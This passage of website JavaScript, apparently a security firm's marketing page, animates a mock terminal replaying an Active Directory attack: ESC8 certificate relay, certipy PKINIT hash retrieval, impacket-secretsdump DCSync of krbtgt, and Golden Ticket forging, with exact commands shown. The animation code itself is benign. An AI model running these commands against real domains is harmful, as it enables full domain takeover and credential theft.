              '<span class="tl-dim">[*] Authenticating against http://adcs01.acme.local/certsrv/certfnsh.asp as ACME/DC01$ SUCCEED</span>',
              '<span class="tl-dim">[*] HTTP server returned status 200 · treating as successful login</span>',
              '<span class="tl-ok">[*] GOT CERTIFICATE! ID 247</span>',
              '<span class="tl-ok">[*] Base64 certificate of user DC01$ saved to dc01.pfx</span>',
              '<span class="tl-hi">[+] cert valid until 2027-04-18</span>',
            ],
            pace: 'scan', postWait: 900,
          },
          {
            cmd: '<span class="tl-cmd">certipy</span> auth <span class="tl-flag">-pfx</span> dc01.pfx <span class="tl-flag">-dc-ip</span> <span class="tl-num">10.10.10.10</span>',
            out: [
              '<span class="tl-dim">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span>',
              '<span class="tl-dim">[*] Using principal: dc01$@acme.local</span>',
              '<span class="tl-dim">[*] Trying to get TGT...</span>',
              '<span class="tl-dim">[*] Got TGT · requesting NT hash via PKINIT</span>',
              '<span class="tl-ok">[+] Got hash for <span class="tl-user">dc01$</span>@acme.local: aad3b435...:<span class="tl-pass">8c3f2e9a7b4c1d58f</span></span>',
            ],
            pace: 'scan', postWait: 900,
          },
          {
            cmd: '<span class="tl-cmd">impacket-secretsdump</span> <span class="tl-flag">-hashes</span> :8c3f2e9a7b4c1d58f <span class="tl-domain">acme.local</span>/<span class="tl-user">DC01$</span>@<span class="tl-num">10.10.10.10</span> <span class="tl-flag">-just-dc</span>',
            out: [
              '<span class="tl-dim">Impacket v0.12.0 - Copyright Fortra, LLC</span>',
              '<span class="tl-dim">[*] Target system bootKey: 0x4a7f...</span>',
              '<span class="tl-dim">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span>',
              '<span class="tl-ok">acme.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:<span class="tl-pass">d7e6...91a</span>:::</span>',
              '<span class="tl-ok">acme.local\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<span class="tl-pass">8c31...fd4</span>:::</span>',
              '<span class="tl-dim">[*] Cleaning up...</span>',
              '<span class="tl-hi">[+] Domain fully compromised via ESC8 · krbtgt acquired</span>',
            ],
            pace: 'burst', postWait: 1100,
          },
          {
            cmd: '<span class="tl-cmd">impacket-ticketer</span> <span class="tl-flag">-nthash</span> 8c31...fd4 <span class="tl-flag">-domain-sid</span> S-1-5-21-3842-1987-4215 <span class="tl-flag">-domain</span> <span class="tl-domain">acme.local</span> <span class="tl-user">Administrator</span>',
            out: [
              '<span class="tl-dim">[*] Creating basic skeleton ticket and PAC Infos</span>',
              '<span class="tl-dim">[*] Customizing ticket for acme.local/Administrator</span>',
              '<span class="tl-dim">[*]   PAC_LOGON_INFO</span>',
              '<span class="tl-dim">[*]   PAC_CLIENT_INFO_TYPE</span>',
              '<span class="tl-dim">[*]   EncTicketPart</span>',
              '<span class="tl-hi">[+] Saving ticket in Administrator.ccache · valid for 10 years</span>',
            ],
            pace: 'dwell', postWait: 1100,
          },
        ],
        notes: [
          [{ text: 'ADCS CA found · web enrollment enabled', cls: 'flag' }],
          [{ text: 'ESC8 confirmed · no CA protections', cls: 'flag' }],
          [{ text: 'relay listener armed for certsrv', cls: '' }],
          [{ text: 'PetitPotam · DC coerced via EFSRPC', cls: 'ok' }],
          [{ text: 'DC01$ cert obtained from ADCS', cls: 'ok' }],
          [{ text: 'NT hash extracted via PKINIT', cls: 'ok' }],
          [{ text: 'DCSync · krbtgt captured', cls: 'hot' }],
          [{ text: 'Golden Ticket forged · 10y validity', cls: 'hot' }],
        ],
      },
    ];

    // Active chapter state — reassigned per loop by pickChapter()
    var activeChapter = chapters[0];
    var frames = activeChapter.frames;
    var notesByFrame = activeChapter.notes;

    var lineDelay = 180;          // ms between output lines (default)
    var interFrameWait = 1100;    // pause after output before next prompt
    var clearBetweenLoops = true;
    var maxLinesBeforeScroll = 18;

    function delayForPace(pace, lineIdx, total) {
      if (pace === 'scan')  return 80 + Math.random() * 40;
      if (pace === 'burst') return 28 + Math.random() * 18;
      if (pace === 'dwell') return 220 + Math.random() * 100;
      if (pace === 'crack') {
        if (lineIdx >= total - 2) return 380 + Math.random() * 120;
        return 90 + Math.random() * 40;
      }
      return lineDelay;
    }

    // Frame index → process-timeline step. First frame = discovery, last = reporting,
    // everything in between = exploitation. Works for variable-length chapters.
    function phaseFor(frameIdx, total) {
      if (frameIdx === 0) return { step: 2, label: 'discovery' };
      if (frameIdx >= total - 1) return { step: 4, label: 'reporting' };
      return { step: 3, label: 'exploitation' };
    }

    var termClockEl = document.querySelector('[data-term-clock]');
    var termPhaseEl = document.querySelector('[data-term-phase]');
    var termObjectiveEl = document.querySelector('[data-term-objective]');
    var notesListEl = document.querySelector('[data-term-notes]');
    var notesCountEl = document.querySelector('[data-term-notes-count]');
    var loadEl = document.querySelector('[data-term-load]');
    var upEl = document.querySelector('[data-term-up]');
    var downEl = document.querySelector('[data-term-down]');
    var toggleBtn = document.querySelector('[data-term-toggle]');
    var termProcessDriven = false;
    var clockTimer = null;
    var clockStart = 0;
    var clockPausedAt = 0;
    var paused = false;
    var pauseResolver = null;

    // Pick a random chapter and bind it as the active frames/notes for the next loop
    function pickChapter() {
      var c = chapters[Math.floor(Math.random() * chapters.length)];
      activeChapter = c;
      frames = c.frames;
      notesByFrame = c.notes;
      if (termObjectiveEl) termObjectiveEl.textContent = c.objective;
      return c;
    }

    function pad2(n) { return (n < 10 ? '0' : '') + n; }
    function formatClock(ms) {
      var s = Math.floor(ms / 1000);
      return pad2(Math.floor(s / 3600)) + ':' + pad2(Math.floor((s % 3600) / 60)) + ':' + pad2(s % 60);
    }
    function startClock() {
      stopClock();
      clockStart = Date.now();
      if (termClockEl) termClockEl.textContent = '00:00:00';
      clockTimer = setInterval(function () {
        if (paused) return;
        if (termClockEl) termClockEl.textContent = formatClock(Date.now() - clockStart);
      }, 1000);
    }
    function stopClock() {
      if (clockTimer) { clearInterval(clockTimer); clockTimer = null; }
    }

    // Operator notes — append a timestamped one-liner to the side pane. Timestamp uses
    // the current T+ clock value so it stays in lockstep with the engagement progression.
    var noteCount = 0;
    function addNote(entry) {
      if (!notesListEl) return;
      var clockText = termClockEl ? termClockEl.textContent : '00:00:00';
      var shortTime = clockText.slice(-5); // show MM:SS, not HH:MM:SS
      var item = document.createElement('span');
      item.className = 'c-term-notes__item';
      var timeEl = document.createElement('span');
      timeEl.className = 'c-term-notes__time';
      timeEl.textContent = '+' + shortTime;
      var textEl = document.createElement('span');
      var cls = 'c-term-notes__text';
      if (entry.cls) cls += ' c-term-notes__text--' + entry.cls;
      textEl.className = cls;
      textEl.textContent = entry.text;
      item.appendChild(timeEl);
      item.appendChild(textEl);
      notesListEl.appendChild(item);
      notesListEl.scrollTop = notesListEl.scrollHeight;
      noteCount++;
      if (notesCountEl) notesCountEl.textContent = noteCount;
    }
    function resetNotes() {
      if (notesListEl) notesListEl.innerHTML = '';
      noteCount = 0;
      if (notesCountEl) notesCountEl.textContent = '0';
    }

    // Status-line drift — load average + sync bandwidth tick every few seconds
    function tickStatus() {
      if (loadEl) loadEl.textContent = (0.32 + Math.random() * 0.45).toFixed(2);
      if (upEl)   upEl.textContent   = (6 + Math.floor(Math.random() * 11)) + 'MB';
      if (downEl) downEl.textContent = (180 + Math.floor(Math.random() * 220)) + 'KB';
    }
    tickStatus();
    setInterval(function () { if (!paused) tickStatus(); }, 3600);

    // Pause / play — blocks the loop at await points while paused
    function waitIfPaused() {
      if (!paused) return Promise.resolve();
      return new Promise(function (resolve) { pauseResolver = resolve; });
    }
    function togglePause() {
      paused = !paused;
      if (toggleBtn) {
        toggleBtn.classList.toggle('is-paused', paused);
        toggleBtn.setAttribute('aria-label', paused ? 'Resume the replay' : 'Pause the replay');
      }
      if (paused) {
        clockPausedAt = Date.now() - clockStart;
      } else {
        // Rebase clockStart so resumed T+ picks up from the paused value
        if (clockPausedAt) clockStart = Date.now() - clockPausedAt;
        if (pauseResolver) { pauseResolver(); pauseResolver = null; }
      }
    }
    if (toggleBtn) {
      toggleBtn.addEventListener('click', togglePause);
    }

    function applyPhase(frameIdx) {
      var p = phaseFor(frameIdx, frames.length);
      if (termPhaseEl) termPhaseEl.textContent = p.label;
      if (window.__process && window.__process.activate) {
        if (!termProcessDriven && window.__process.disableAuto) {
          window.__process.disableAuto();
          termProcessDriven = true;
        }
        window.__process.activate(p.step);
      }
    }

    // Human typing cadence — normal-ish distribution around 90ms, clamped 35–210
    function humanCharDelay() {
      var u1 = Math.random() || 0.0001;
      var u2 = Math.random();
      var z = Math.sqrt(-2 * Math.log(u1)) * Math.cos(2 * Math.PI * u2);
      var ms = 90 + z * 32;
      if (ms < 35)  ms = 35;
      if (ms > 210) ms = 210;
      return ms;
    }
    // Token-boundary "thinking" pause — only fires on space boundaries
    function maybeTokenPause() {
      if (Math.random() < 0.7) return 260 + Math.random() * 420;
      return 0;
    }

    var rafHandle = null;

    function appendLine(html) {
      var div = document.createElement('span');
      div.className = 'tl-line';
      div.innerHTML = html;
      term.appendChild(div);
      term.scrollTop = term.scrollHeight;
    }

    function removeCursor() {
      var c = term.querySelector('.tl-cursor');
      if (c) c.remove();
    }

    function writePrompt() {
      removeCursor();
      appendLine(P1);
      var promptLine = document.createElement('span');
      promptLine.className = 'tl-line';
      promptLine.innerHTML = P2;
      var cursor = document.createElement('span');
      cursor.className = 'tl-cursor';
      promptLine.appendChild(cursor);
      term.appendChild(promptLine);
      return promptLine;
    }

    function sleep(ms) {
      return new Promise(function (r) { setTimeout(r, ms); });
    }

    async function typeHtmlInto(line, html) {
      // Parse HTML into a tmp node, then stream its characters, preserving tags
      var tmp = document.createElement('div');
      tmp.innerHTML = html;
      var cursor = line.querySelector('.tl-cursor');
      // Walk nodes and type content character-by-character with human cadence
      async function typeNode(node, target) {
        if (node.nodeType === Node.TEXT_NODE) {
          var text = node.textContent;
          for (var i = 0; i < text.length; i++) {
            target.insertBefore(document.createTextNode(text[i]), cursor);
            await sleep(humanCharDelay());
            if (text[i] === ' ') {
              var pause = maybeTokenPause();
              if (pause) await sleep(pause);
            }
          }
        } else if (node.nodeType === Node.ELEMENT_NODE) {
          var clone = document.createElement(node.tagName);
          for (var a = 0; a < node.attributes.length; a++) {
            clone.setAttribute(node.attributes[a].name, node.attributes[a].value);
          }
          target.insertBefore(clone, cursor);
          for (var c = 0; c < node.childNodes.length; c++) {
            await typeChildIntoClone(node.childNodes[c], clone);
          }
        }
      }
      async function typeChildIntoClone(node, clone) {
        if (node.nodeType === Node.TEXT_NODE) {
          var text = node.textContent;
          for (var i = 0; i < text.length; i++) {
            clone.appendChild(document.createTextNode(text[i]));
            await sleep(humanCharDelay());
            if (text[i] === ' ') {
              var pause = maybeTokenPause();
              if (pause) await sleep(pause);
            }
          }
        } else if (node.nodeType === Node.ELEMENT_NODE) {
          var sub = document.createElement(node.tagName);
          for (var a = 0; a < node.attributes.length; a++) {
            sub.setAttribute(node.attributes[a].name, node.attributes[a].value);
          }
          clone.appendChild(sub);
          for (var c = 0; c < node.childNodes.length; c++) {
            await typeChildIntoClone(node.childNodes[c], sub);
          }
        }
      }
      for (var i = 0; i < tmp.childNodes.length; i++) {
        await typeNode(tmp.childNodes[i], line);
      }
    }

    // "Pasted" command — reveal the full command HTML instantly before the cursor
    function pasteHtmlInto(line, html) {
      var cursor = line.querySelector('.tl-cursor');
      var tmp = document.createElement('span');
      tmp.innerHTML = html;
      while (tmp.firstChild) line.insertBefore(tmp.firstChild, cursor);
    }

    async function runFrame(frame, frameIdx, pasteMode) {
      await waitIfPaused();
      applyPhase(frameIdx);
      var line = writePrompt();
      if (pasteMode) {
        pasteHtmlInto(line, frame.cmd);
        await sleep(240);
      } else {
        await typeHtmlInto(line, frame.cmd);
      }
      await sleep(300);
      removeCursor();
      // Output pacing read from the frame itself — each chapter author picked per-command
      var pace = frame.pace || 'scan';
      var total = frame.out.length;
      for (var i = 0; i < total; i++) {
        await waitIfPaused();
        appendLine(frame.out[i]);
        await sleep(delayForPace(pace, i, total));
      }
      // Commit operator notes for this frame to the side pane
      var notes = notesByFrame[frameIdx] || [];
      for (var n = 0; n < notes.length; n++) addNote(notes[n]);
      await sleep(frame.postWait || interFrameWait);
    }

    // Establishing-shot banner — orients the viewer at the start of every loop.
    // Uses the chapter's title + objective so each loop reads as its own attack story.
    function writeBanner(chapter) {
      appendLine('<span class="tl-dim">─── ENGAGEMENT · ACME CORP · </span><span class="tl-hi">' + chapter.title.toUpperCase() + '</span><span class="tl-dim"> ───</span>');
      appendLine('<span class="tl-dim">  host  </span><span class="tl-hi">kali-op1</span><span class="tl-dim">  ·  vpn  </span><span class="tl-hi">acme-ops</span><span class="tl-dim">  ·  session  </span><span class="tl-hi">tmux 0:0*</span>');
      appendLine('<span class="tl-dim">  objective  </span><span class="tl-hi">' + chapter.objective + '</span><span class="tl-dim">  ·  operator  </span><span class="tl-hi">kwangyun</span>');
      appendLine('<span class="tl-dim">  ─────────────────────────────────────────────</span>');
    }

    async function runLoop() {
      while (true) {
        await waitIfPaused();
        if (clearBetweenLoops) {
          term.classList.add('is-resetting');
          await sleep(300);
          term.innerHTML = '';
          term.classList.remove('is-resetting');
          resetNotes();
          await sleep(120);
        }
        var chapter = pickChapter();
        startClock();
        writeBanner(chapter);
        await sleep(900);
        // One random frame per loop "pastes" instead of types — feels like a real operator
        var pasteIdx = Math.floor(Math.random() * frames.length);
        for (var i = 0; i < frames.length; i++) {
          await runFrame(frames[i], i, i === pasteIdx);
        }
        await sleep(1600);
      }
    }

    // Only start when visible — saves CPU. Observe the terminal itself.
    var started = false;
    function start() {
      if (started) return;
      started = true;
      runLoop();
    }
    if ('IntersectionObserver' in window) {
      var io = new IntersectionObserver(function (entries) {
        entries.forEach(function (e) { if (e.isIntersecting) start(); });
      }, { threshold: 0.1 });
      io.observe(term);
    } else {
      start();
    }
  }

  // ── Boot ─────────────────────────────────────────────────────────────────
  document.addEventListener('DOMContentLoaded', function () {
    // Aurora / noise / grid disabled for light theme
    // initAurora();
    // initNoise();
    // initGrid();
    initNav();
    initReveal();
    initCounters();
    initMagnetic();
    initNavHighlight();
    initProcessTabs();
    initLiveTerminal();
  });
})();
